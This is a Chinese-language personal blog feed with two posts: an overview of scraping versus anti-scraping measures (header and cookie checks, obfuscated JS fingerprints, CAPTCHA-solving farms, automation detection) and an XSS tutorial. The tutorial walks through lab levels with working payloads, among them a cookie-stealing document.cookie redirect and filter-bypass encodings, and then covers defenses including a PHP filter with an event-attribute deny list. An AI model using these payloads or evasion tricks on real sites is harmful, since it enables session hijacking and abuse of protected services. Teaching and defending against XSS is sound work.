<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>aprilwind`bolg</title>
  <icon>https://www.gravatar.com/avatar/946eba3138b314ba7a6bb92d4edbf8a0</icon>
  <subtitle>就是没事写着玩，提前给大家摆个年！：）</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-12T09:17:16.745Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Eric Ding</name>
    <email>598020642@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>爬虫与反爬（简要记录）</title>
    <link href="http://yoursite.com/2020/04/14/%E7%88%AC%E8%99%AB%E4%B8%8E%E5%8F%8D%E7%88%AC%EF%BC%88%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/14/%E7%88%AC%E8%99%AB%E4%B8%8E%E5%8F%8D%E7%88%AC%EF%BC%88%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%EF%BC%89/</id>
    <published>2020-04-13T16:16:40.000Z</published>
    <updated>2020-10-12T09:17:16.745Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见爬虫与反爬简介（python小记）"><a href="#常见爬虫与反爬简介（python小记）" class="headerlink" title="常见爬虫与反爬简介（python小记）"></a>常见爬虫与反爬简介（python小记）</h2><p>#- 常见的反爬取措施</p><blockquote><ul><li>反爬措施千奇百怪，五花八门，除了一些大厂的硬核各种加密身份验证加密还有各种脑回路新奇的歪门邪道。这里我们就看看最最常见的。    </li></ul></blockquote><h3 id="模拟请求"><a href="#模拟请求" class="headerlink" title="模拟请求"></a>模拟请求</h3><hr><p>###1，headers检查，</p><blockquote><p>header检查也就是检查http请求中的headers数据，那么headers长什么样喃？下面我们以<a href="http://www.xiaozhu.com/">小猪短租</a>(<strong>为什么是小猪短租喃？不要问，问就是帮老东家刷点流量</strong>)为例看看：<br><img src="/2020/04/14/%E7%88%AC%E8%99%AB%E4%B8%8E%E5%8F%8D%E7%88%AC%EF%BC%88%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%EF%BC%89/1586773028678.jpg" alt="headers数据"></p><p>可以看到，headers中有很多数据，数据多那能做文章的也就很多；我们一个一个的看：<br>首先是User-Agent， Referer</p><blockquote><p>User-Agent 是检查请求方是来自什么设备，什么驱动（浏览器）和什么系统；直接检查它就能知道很多关于访问者的信息，有些头发茂盛的程序猿忘记或者使用不规范（太老旧的ua，大量访问没有随机更换ua）同理Referer，referer是验证你是请求是来自哪个请求域的，有没有跨站请求（跨站脚本）只要你的referer不正确或者referer的上级不正确亦或上级的上级…………，就在这里被拦截住了；<br>而被拦截的方式也有很多种，<br>    qq</p></blockquote></blockquote><blockquote><p>当然这中小手段也就骗骗新手，遇到这样的问题根本就不会掉头发。那就来看看cookies；</p><blockquote><p>cookies和上面一样同样都是文本属性的验证，主要是来描绘用户画像的，一旦用户画像数据不对就直接触发上面的拦截情况。<br>那能不能像解决User-Agent， Referer一样来解决cookies喃？当然可以，但是！有些cookies中会含有一些随机变量的参数，这个参数从简单的更具时间戳来生成到几千几万上的js动态加密都有；这里讲讲都有什么样的加密：</p><ul><li><p>刚刚说了有简单时间戳加密，这里你就可以简单的找找规律一般都能很快的被处理。</p></li><li><p>来看看带有身份验证的cookies吧，这样的cookies就会带有用户的信息。同样只要对方程序员头发多一般都很好找到办法和规律。</p></li></ul><h5 id="cookies中还有很多其他的属性，例如NAME-VALUE；Expires-DATE；Path-PATH；Domain-DOMAIN-NAME；这里简单的说说，"><a href="#cookies中还有很多其他的属性，例如NAME-VALUE；Expires-DATE；Path-PATH；Domain-DOMAIN-NAME；这里简单的说说，" class="headerlink" title="cookies中还有很多其他的属性，例如NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME；这里简单的说说，"></a>cookies中还有很多其他的属性，例如NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME；这里简单的说说，</h5><ul><li><p>主要的就是记录了cookies的作用域：只能在指定的uri下才能起作用。</p></li><li><p>过期时间：就是cookies在一定的时间内是有效的，超过了这个时间cookes就不能使用。</p></li></ul><h5 id="cookies上面那些都只是更具cookies的属性去设置风控的措施，而真正有追求的程序猿都是要有自己独享的moment-code-w自如警告-，一般就是在上面的基础上添加参数验证，而这些参数的生成就有难度了，我也就大概讲一下："><a href="#cookies上面那些都只是更具cookies的属性去设置风控的措施，而真正有追求的程序猿都是要有自己独享的moment-code-w自如警告-，一般就是在上面的基础上添加参数验证，而这些参数的生成就有难度了，我也就大概讲一下：" class="headerlink" title="cookies上面那些都只是更具cookies的属性去设置风控的措施，而真正有追求的程序猿都是要有自己独享的moment code (w自如警告)，一般就是在上面的基础上添加参数验证，而这些参数的生成就有难度了，我也就大概讲一下："></a>cookies上面那些都只是更具cookies的属性去设置风控的措施，而真正有追求的程序猿都是要有自己独享的moment code (w自如警告)，一般就是在上面的基础上添加参数验证，而这些参数的生成就有难度了，我也就大概讲一下：</h5><p><img src="/2020/04/14/%E7%88%AC%E8%99%AB%E4%B8%8E%E5%8F%8D%E7%88%AC%EF%BC%88%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%EF%BC%89/IMG_0671.JPG" alt="令人头秃"></p><ul><li><p>指纹加密，主要就是前几年比较常用的，这几年出现了很多变异版本，直白的说就是，通过设备信息（ip，mac地址等）时间戳，还有服务器给的身份参数，还有就是服务的随机数（一般就是hash uuid）通过随机加密脚本来生成当前验证的参数，一般这种加密方式就十分丰富了，根据程序猿的变态程度来定的了；动不动就是几千几万行的js加密函数，还是被混淆了的代码，直接攻方没有读代码的胃口。<strong>很吓人？不怕，只要头发足够少都能解出来，找到生成规律就行；什么你要问我有没有破解经验？当然有，但是我满头乌黑的头发……</strong>，其实这种破解方式很不好，应为你好废了很大的力气，破解了别人的js代码，别人随便动动脚趾改两个参数，你又要搞上很久。    </p></li><li><p>同样的还有<strong>点击验证</strong>，<strong>滑动验证</strong>，<strong>滑块验证</strong>其实都是js数据加密方式，破解方法其实也就是找到对应的<strong>混淆代码（我就没见过没有没被混淆过的加密代码）</strong>，</p></li><li><p>阿里云的滑动验证就是通过滑动参数生成一个3*3至9*9矩阵的参数，通过随机js加密脚本返回一串字符，这里我们要做的就是找到这个随机加密脚本，并且获取到加密接口的参数通过执行js脚本来获取到最终的认证参数。大概的流程是这样的（我做过的且成功的大致都是这样的流程）。</p></li><li><p><strong>至于那些图片验证，数字验证简单都有专门的 –打¥%#%#码 –平台给你用，你只需要见一个简单的接口用来调用就可以了，至于那些很难的文字验证要么就是训练机器学习模型识别，还有就是打码平台这个是可以做的（对的这个。–打¥%#%#码 –是有真人帮你填些的，中国3点几亿的网民，–招打字员，日结200–这种广告看过吧，对对对这种黑产很多人做的）</strong></p></li><li><p>还有就是最近很多网站都添加了debuger toolDesktop无限阻断，你只要打开toolDesktop（浏览器按F12弹出来那个框），就会无限的进入断点模式，让你无法在chrome上进行调试js脚本，不过解决方案也是有的就是找到阻断脚本篡改debuger参数就可以了。</p></li></ul></blockquote></blockquote><blockquote><blockquote></blockquote></blockquote><h2 id="自动化篇"><a href="#自动化篇" class="headerlink" title="##自动化篇"></a>##自动化篇</h2><h3 id="总的来说上面的那些东西都是在亲自去模拟整个请求，最近这段时间大家都用上了驱动自动化的爬虫（Selenium-splinter-pyppeteer-PhantomJS【已经停止开发了，又老又旧请忘记】）"><a href="#总的来说上面的那些东西都是在亲自去模拟整个请求，最近这段时间大家都用上了驱动自动化的爬虫（Selenium-splinter-pyppeteer-PhantomJS【已经停止开发了，又老又旧请忘记】）" class="headerlink" title="总的来说上面的那些东西都是在亲自去模拟整个请求，最近这段时间大家都用上了驱动自动化的爬虫（Selenium, splinter, pyppeteer, PhantomJS【已经停止开发了，又老又旧请忘记】）"></a>总的来说上面的那些东西都是在亲自去模拟整个请求，最近这段时间大家都用上了驱动自动化的爬虫（Selenium, splinter, pyppeteer, PhantomJS【已经停止开发了，又老又旧请忘记】）</h3><blockquote><ul><li>其实这些所谓的自动化就是使用想对应的浏览器驱动去执行网站的访问，因为有完整的底层引擎的驱动能像正常浏览器一样执行js脚本和css渲染。<strong>所以能完成正常的浏览器所有动作，这样我们就不用去破解js脚本获取对应的参数</strong>，但是这样的爬虫失去了直接模拟请求的爬虫的速度，爬取适度非常慢，<strong>公用相同的驱动内存，导致在一个内存区域无法实现并行爬取</strong>。   </li><li>那么使用自动化的爬取就能正常的获取数据数据吗？no! no! no! 程序猿中有一群头顶没毛，他们也有各种方法让你这个自动化无法使用，他们精通这些框架的源码和运行原理，<strong>他们通过判断这些自动化驱动的底层的特征参数，来判断这个请求是否是整整的一个正常的用户，而这些特征数据一共有90个，最常用的就是是否是自动化测试驱动的参数（excludeSwitches），还有无gui（–headless），沙盒模式（–no-sandbox）等等</strong>，这些参数你知道你对面那个变态检测了哪些？而且很多的参数是无法通过修改参数来实现的伪装的。<br><img src="/2020/04/14/%E7%88%AC%E8%99%AB%E4%B8%8E%E5%8F%8D%E7%88%AC%EF%BC%88%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%EF%BC%89/IMG_1912.JPG" alt="令人头秃"></li></ul></blockquote><h2 id="来个简要的总结吧："><a href="#来个简要的总结吧：" class="headerlink" title="来个简要的总结吧："></a>来个简要的总结吧：</h2><blockquote><ul><li>爬虫最早是2000年出现的，在前面几年（在国内2012-现在）发展迅速，这场灵长类头脑内斗的战争中，大家都在相互内耗；</li></ul></blockquote><blockquote><ul><li>一个比一个做的绝，头发也是一个比一个少，现在网上那么多<strong>学python广告</strong>，是python真多很火爆吗？工资高？机会多？不不不，现在信息社会发展这么快， 信息的传播和消化周期也是越来越短，很多信息当传到你的手上的时候可能已经一点营养都没有了；<strong><em>看上去斗大的盘子可能你信誓旦旦的冲上去的时候就只能舔舔盘子，你要是跑得慢了；那就等着接盘吧！</em></strong></li><li>所以你要是一个非计算机行业的，中途想入坑的，我的建议是<strong>算了，这个饭它不是广告上面形容的那么“软”，我劝退！！</strong></li></ul></blockquote><blockquote><h2 id="四月微风记于庚子年-【鼠年】庚辰月-丙戌日"><a href="#四月微风记于庚子年-【鼠年】庚辰月-丙戌日" class="headerlink" title="四月微风记于庚子年 【鼠年】庚辰月 丙戌日"></a>四月微风记于庚子年 【鼠年】庚辰月 丙戌日</h2></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常见爬虫与反爬简介（python小记）&quot;&gt;&lt;a href=&quot;#常见爬虫与反爬简介（python小记）&quot; class=&quot;headerlink&quot; title=&quot;常见爬虫与反爬简介（python小记）&quot;&gt;&lt;/a&gt;常见爬虫与反爬简介（python小记）&lt;/h2&gt;&lt;p&gt;#-
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>xss攻击与防守</title>
    <link href="http://yoursite.com/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/"/>
    <id>http://yoursite.com/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/</id>
    <published>2019-11-01T03:31:09.000Z</published>
    <updated>2019-11-01T05:07:10.000Z</updated>
    
    <content type="html"><![CDATA[<p> 什么是xss?</p><blockquote><ul><li>开放式Web应用程序安全项目（Open Web Application Security Project，OWASP）是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年和2010年统计过十大Web安全漏洞，如图下图所示：<br><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/actk_top.jpg" alt="攻击排行榜">    </li><li>我们看到xss高居第二！    </li><li>除此之外在我们生活中也能经常看到很被攻击的：<br><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/qq_mail_actk.jpg" alt="被攻击的qq邮箱"><br><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/goolge_actk.jpg" alt="被攻击的谷歌"></li></ul></blockquote><blockquote><ul><li>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在Web应用程序中的计算机安全漏洞，是由于Web应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码（通常包括HTML代码和客户端Javascript脚本）注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取Cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。</li></ul></blockquote><blockquote><ul><li>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行，流程如图:</li></ul><p><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/actk.jpg" alt="反射xss"><br>###主要类型：</p><ul><li>Reflected XSS（基于反射的XSS攻击）</li><li>Stored XSS（基于存储的XSS攻击）</li><li>DOM-based or local XSS（基于DOM或本地的XSS攻击）</li></ul><p><em>按照攻击方式来分</em>：    </p><p><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/type.png" alt="攻击方式分类"></p><hr><p>###Reflected XSS（基于反射的XSS攻击）:</p><ul><li><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。这种类型的跨站脚本是最常见，也是使用最广的一种，主要用于将恶意脚本附加到URL地址的参数中</p></li><li><p>此类 XSS 通常出现在网站的搜索栏、用户登入口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p></li></ul><p>exp:<br>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?">简单的靶场</a><br>简单的跳转攻击：<br><code>&lt;/pre&gt;&lt;a href=&quot;http://www.xiaozhu.com/&quot;&gt;小姐姐&lt;/a&gt;&lt;pre&gt;</code></p><p>简单的获取cookies：<br><code>&lt;script&gt;document.location=&#39;http://43.247.91.228:81/vulnerabilities/xss_r/?&#39;+document.cookie&lt;/script&gt;</code></p><hr><p>###Stored XSS（基于存储的XSS攻击）：</p><ul><li>持久型 XSS 一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在页面中，即在受害者主机上的浏览器执行恶意代码。<br>如图：</li></ul><p><img src="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/save_actk.jpg" alt="持久xss攻击">。  </p><ul><li>exp:   </li><li>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?">简单的靶场</a><br>简单的持久攻击：<br><code>小姐姐&lt;/div&gt;&lt;button type=&quot;button&quot;&gt;&lt;a href=&quot;http://www.xiaozhu.com/&quot;&gt;小姐姐&lt;/a&gt;&lt;/button&gt;</code></li></ul><hr><p>###DOM-based or local XSS（基于DOM或本地的XSS攻击）:</p><ul><li><p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。所以他的攻击原理就和 Reflected XSS（基于反射的XSS攻击）一样了</p></li><li><p>exp:   </p></li><li><p>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?">简单的靶场</a><br>简单的DOM攻击：<br><code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;This is DOM XSS&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></p></li></ul><hr><p>###防御：</p><ul><li><p>要解决问题首先要知道问题是怎么产生的，所以这里我们来详细的看看不同种类的攻击是如何工作的。</p></li><li><p>在前面我们说到了，反射型的攻击是最为常见的，相对于其他的两种类型的攻击来说的话在技能上要求也是比较简单的。我们就来详细的看看是如何工作的：    </p></li><li><p>目标：<a href="http://xss.fbisb.com/yx/level1.php?name=test">简单的靶场2</a> </p></li></ul><p>新手村卡拉赞：  </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level1.php?name=test">简单的靶场2</a><br><code>&lt;script&gt;alert()&lt;/script&gt;</code></li></ul><p>怒焰裂谷:  </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level2.php?name=test">简单的靶场2</a><br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></li></ul><p>哀嚎洞穴：  </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level4.php?name=test">简单的靶场2</a><br><code>&quot; οnclick=alert() type=&quot;</code></li></ul><blockquote><p>这里我们就进入了事件攻击类型了，但是任然属于反射xss</p></blockquote><p>影牙城堡:   </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level5.php?keyword=">简单的靶场2</a><br><code>&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;</code></li></ul><p>黑暗深渊：  </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level6.php?keyword=">简单的靶场2</a><br><code>&quot; /&gt;&lt;a hrEF=javascript:alert()&gt;something&lt;/a&gt;</code><blockquote><p>这里我们就开始遇到关键词的替换了</p></blockquote></li></ul><p>诺莫瑞根：  </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level7.php?keyword=move%20up!">简单的靶场2</a> <blockquote><p>在这个副本中我们就能看到这里也是对关键词进行替换。<br>这里我们将被替换的关键词进行编码，这里主要是进行了十进制编码，同样的我们可以使用十六进制进行编码和其他的，这里我们需要查看具体支持那些编码。<br><code>javascrip&amp;#116:alert()</code><br>_sort=” type=”text” οnclick=alert() “`</p></blockquote></li></ul><p>沉没的神庙:    </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level10.php?keyword=move%20up!">简单的靶场2</a><br><code>t_sort=&quot; type=&quot;text&quot; οnclick=alert() &quot;</code><blockquote><p>在这里我们就开始对网站的规则进行猜测，这个在很多的大型网站中是很难找到具体的规则。</p></blockquote></li></ul><p>黑石深渊：    </p><ul><li>目标：<a href="http://xss.fbisb.com/yx/level11.php?keyword=move%20up!">简单的靶场2</a>  <blockquote><p>这里我们就是注入型的xss，xss的攻击就主要变成了地请求的串改了。当然不止是对referer的攻击，还有可能对UA,cookies，uri等。</p></blockquote></li></ul><hr></blockquote><p>当然我们这里只是把各种xss的方式展现给大家了，很多地方都是需要我们自己去动手详细的去操作，并找到更多的攻击方并了解攻击原理，这样我们才能很好的预防和完善我们的程序。</p><blockquote><p>###进阶攻击：</p><ul><li>session劫持：<br>Session 的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是基于访问的进程，记录了一个访问的开始到结束，当浏览器或进程关闭之后，Session也就“消失”了。<br>在Session机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也会有被其他人利用的可能。<br>Session和Cookie的最大区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面。<br>我们之所以要了解Session机制，是因为它与XSS跨站脚本之间息息相关。所谓的“会话劫持”，其实就是指攻击者利用XSS劫持了用户的会话去执行某些恶意操作（或攻击），这些操作往往能达到提升权限的目的。<br>这里需要注意的是：会话概念一般是基于Cookie的，会话劫持的本质是在攻击中带上了Cookie并发送到服务端。<br>为了让大家深入理解会话劫持的原理，以及这种攻击的严重性。</li></ul></blockquote><blockquote><ul><li>XSS 蠕虫:<br>持久型XSS不需要用户去单击URL进行触发，所以它的危害比反射型XSS大，黑客可以利用它渗透网站、挂马、钓鱼……<br>更严重的是，利用此类 XSS 能够轻易编写危害性更大的 XSS 蠕虫，跨站蠕虫是使用Ajax/JavaScript脚本语言编写的蠕虫病毒，能够在网站中实现病毒的几何数级传播，其感染速度和攻击效果都非常可怕。XSS蠕虫会直接影响到网站的所有用户，也就是一个地方出现XSS漏洞，同站点下的所有用户都可能被攻击。可想而知XSS蠕虫对网站的打击是十分巨大的！</li><li><a href="https://www.2cto.com/article/201609/545085.html">https://www.2cto.com/article/201609/545085.html</a>  </li></ul><hr><ul><li>兄弟们，讲到这里了，还不点…………,嗯，我来看看需要这么做来应对，<br>在上面点打副本中我们已经知道了一些防御点手段这里来这个一个总结和发散：      </li></ul><blockquote><p>表单数据指定值的类型;过滤或移除特殊的 html 标签; 过滤 js 事件的标签。<br>千言万语汇成一句简单的代码：</p></blockquote><p><code>function filter_xss($string, $allowedtags = &#39;&#39;, $disabledattributes = array(&#39;onabort&#39;,&#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterupdate&#39;, &#39;onbeforeactivate&#39;, &#39;onbeforecopy&#39;,&#39;onbeforecut&#39;, &#39;onbeforedeactivate&#39;, &#39;onbeforeeditfocus&#39;, &#39;onbeforepaste&#39;,&#39;onbeforeprint&#39;,&#39;onbeforeunload&#39;, &#39;onbeforeupdate&#39;, &#39;onblur&#39;, &#39;onbounce&#39;,&#39;oncellchange&#39;, &#39;onchange&#39;, &#39;onclick&#39;, &#39;oncontextmenu&#39;, &#39;oncontrolselect&#39;, &#39;oncopy&#39;,&#39;oncut&#39;, &#39;ondataavaible&#39;, &#39;ondatasetchanged&#39;, &#39;ondatasetcomplete&#39;, &#39;ondblclick&#39;,&#39;ondeactivate&#39;, &#39;ondrag&#39;, &#39;ondragdrop&#39;, &#39;ondragend&#39;, &#39;ondragenter&#39;, &#39;ondragleave&#39;,&#39;ondragover&#39;, &#39;ondragstart&#39;, &#39;ondrop&#39;, &#39;onerror&#39;, &#39;onerrorupdate&#39;, &#39;onfilterupdate&#39;,&#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;&#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;onfocusout&#39;, &#39;onhelp&#39;, &#39;onkeydown&#39;, &#39;onkeypress&#39;,&#39;onkeyup&#39;, &#39;onlayoutcomplete&#39;, &#39;onload&#39;, &#39;onlosecapture&#39;, &#39;onmousedown&#39;, &#39;onmouseenter&#39;,&#39;onmouseleave&#39;, &#39;onmousemove&#39;, &#39;onmoveout&#39;, &#39;onmouseover&#39;, &#39;onmouseup&#39;, &#39;onmousewheel&#39;,&#39;onmove&#39;,&#39;onmoveend&#39;, &#39;onmovestart&#39;, &#39;onpaste&#39;, &#39;onpropertychange&#39;,&#39;onreadystatechange&#39;, &#39;onreset&#39;, &#39;onresize&#39;, &#39;onresizeend&#39;, &#39;onresizestart&#39;, &#39;onrowexit&#39;,&#39;onrowsdelete&#39;, &#39;onrowsinserted&#39;, &#39;onscroll&#39;, &#39;onselect&#39;, &#39;onselectionchange&#39;,&#39;onselectstart&#39;, &#39;onstart&#39;, &#39;onstop&#39;, &#39;onsubmit&#39;, &#39;onunload&#39;))&#123; if(is_array($string)) &#123;   foreach($string as $key =&gt; $val) $string[$key] = filter_xss($val, ALLOWED_HTM-LTAGS); &#125; else &#123;   $string = preg_replace(&#39;/\s(&#39;.implode(&#39;|&#39;, $disabledattributes).&#39;).*?([\s\&gt;])/&#39;,&#39;\\2&#39;, preg_replace(&#39;/&lt;(.*?)&gt;/ie&#39;, &quot;&#39;&lt;&#39;.preg_replace(array(&#39;/javascript:[^\&quot;\&#39;]*/i&#39;,&#39;/(&quot;.implode(&#39;|&#39;, $disabledattributes).&quot;)[ \\t\\n]*=[ \\t\\n]*[\&quot;\&#39;][^\&quot;\&#39;]*[\&quot;\&#39;]/i&#39;,&#39;/\s+/&#39;), array(&#39;&#39;, &#39;&#39;, &#39; &#39;), stripslashes(&#39;\\1&#39;)) . &#39;&gt;&#39;&quot;, strip_tags($string,$allowedtags))); &#125;  return $string;&#125;</code></p></blockquote><blockquote><p>这段代码的作用是过滤XSS跨站代码，整个功能封装在filter_xss()中，只要程序在处理输入变量的时候使用该函数，就足以过滤常见的跨站脚本。 </p><hr><p>当然除了对我们的代码进行规范意外，还要对已有的代码进行测试检查这里我们能在github上找到一些开源的工具：</p><p><a href="https://github.com/s0md3v/XSStrike.git">https://github.com/s0md3v/XSStrike.git</a><br>工具提供很多测试方法，脚本关键词扫描，事件扫描，DOM扫描等；</p><ul><li><p>代码审计：<br>除了使用工具测试意外，还要我们自己定期的审计代码；理论上来讲，如果想要尽可能挖掘更多的XSS漏洞，最可靠的方式是进行Web代码安全审计，即审计、检查程序源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞。这里的源代码是指Web服务器端的程序代码，如ASP、JSP、PHP等。<br>众所周知，XSS跨站的原理是向HTML中注入并执行恶意脚本，和大多数的Web安全漏洞一样，它同样是由于不正确的输入输出验证所造成的。归根结底，XSS的产生来自于服务端，所以想彻底杜绝XSS攻击，就必须从服务端程序着手，而进行Web代码安全审计来发掘XSS无疑是最有效的解决方式之一。<br>分析源代码发掘 XSS 的思路一般是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤。<br>HtmlEncode函数的作用是将HTML源文件中不允许出现的字符进行编码，通常是编码以下字符”&lt;”、”&gt;”、”&amp;” 等，许多程序语言都内置相应的函数或库实现该功能，如ASP的Server.HTMLEncode方法和PHP的htmlspecialchars()函数。</p></li><li><p>黑盒测试：<br>不管是采用哪种方式进行 Web 安全测试，都要依照测试者所能取得的相关资源而定，如：白盒测试适用于取得相应的源代码等资源时；黑盒测试则适用于完全无法取得前述资源，只能从程式外部输入可能接收的文件或参数值、并观察其输出结果时；而灰箱测试的适用条件则界于白盒测试与黑盒测试之间。<br>其中，黑盒测试中又可分为人工测试及自动化测试，所谓的“自动化测试”就是指使用自动化测试工具来进行测试，这类测试一般不需要人干预。<br>下面介绍几款可以扫描 XSS 漏洞的自动化测试工具，有了这些工具，便能快速有效地发掘出Web应用程序中的跨站脚本漏洞。<br>Acunetix Web Vulnerability Scanner。<br>Acunetix Web Vulnerability Scanner是一款商业级的Web漏洞扫描程序，它的功能非常强大，可以自动化检测各种Web应用程序中的漏洞，包括XSS、SQL 注入、代码执行、目录遍历、网站程序源代码暴露、CRLF Injection等。<br>读者可以从官方网站获取更多信息：<br><a href="http://www.acunetix.com/vulnerability-scanner。">http://www.acunetix.com/vulnerability-scanner。</a></p></li><li><p>当然开源的肯定没有付费的好，不管是国内还是国外都会有很多提供这方面服务的公司，只要钱到位，就是出问题都会有人帮你弄，</p></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 什么是xss?&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;开放式Web应用程序安全项目（Open Web Application Security Project，OWASP）是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年和2010年统计
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
